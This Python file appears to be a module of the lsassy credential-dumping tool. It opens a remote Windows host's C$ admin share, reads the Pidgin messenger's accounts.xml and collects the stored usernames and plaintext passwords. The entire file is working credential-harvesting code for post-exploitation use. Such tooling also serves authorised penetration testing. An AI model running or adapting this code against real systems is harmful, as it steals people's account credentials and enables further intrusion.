import logging
import os
import xml.etree.ElementTree as ET

from lsassy.credential import Credential
from lsassy.dpapi.config.constant import constant
from lsassy.dpapi.config.moduleinfo import ModuleInfo


class Pidgin(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'pidgin', 'chats')

    def run(self):
        pwd_found = []
        path = os.path.join(constant.profile['APPDATA'], '.purple').replace("{user}", self.user)
        try:
            with self.impacketfile.open("C$", path, "accounts.xml", timeout=0) as f:
                logging.info(f"Found pidgin accounts.xml")
                logging.success(f"Pidgin config file exists!")
                root = ET.fromstring(f.read(f.size()))
                for account in root.findall('account'):
                    name = account.find('name')
                    password = account.find('password')
                    if None not in (name, password):
                        pwd_found.append(Credential(username=name.text, password=password.text))
        except Exception as e:
            return pwd_found
        
        return pwd_found
